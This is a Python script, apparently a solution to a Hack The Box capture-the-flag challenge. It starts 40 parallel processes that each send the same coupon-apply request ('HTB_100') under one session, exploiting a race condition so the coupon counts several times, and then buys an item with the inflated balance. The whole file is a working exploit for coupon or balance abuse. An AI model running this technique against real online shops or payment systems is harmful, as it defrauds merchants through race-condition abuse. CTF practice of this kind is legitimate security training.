#!/usr/bin/python3

import sys
import requests
import urllib.parse as pars
from pprint import pprint
from threading import Thread
from multiprocessing import (
    Lock,
    Process,
    cpu_count,
    shared_memory,
    current_process
)
import os
import time

def get_new_balance(url, cookies):
    coupons_payload = {"coupon_code":"HTB_100"}
    response = requests.post(url=url+"api/coupons/apply", data=coupons_payload, cookies=cookies)


def main():
    try:
        base_url = sys.argv[1]
        sess = requests.session()
        res = sess.post(url=base_url+"api/purchase", json={"coupon_code":"HTB_100"})

        cookies = {
            'session':res.cookies['session']
        }
        processes = list()

        for _ in range(40):
            processes.append(Process(target=get_new_balance, args=(base_url, cookies,)))
        
        for process in processes:
            process.start()

        for process in processes:
            process.join()
        
        new_res = requests.post(base_url+"api/purchase", headers=res.headers, cookies=cookies, json={"item":"C8"})
        try:
            print(new_res.json())
        except Exception as e:
            print("\n\t[*] Level 2")
            print(f"\n\t[*] {str(e)}")
            exit(1)
    except Exception as e:
        print("\n\t[*] Level 1")
        print(f"\n\t[*] {str(e)}")
        exit(1)



if __name__ == "__main__":
    main()


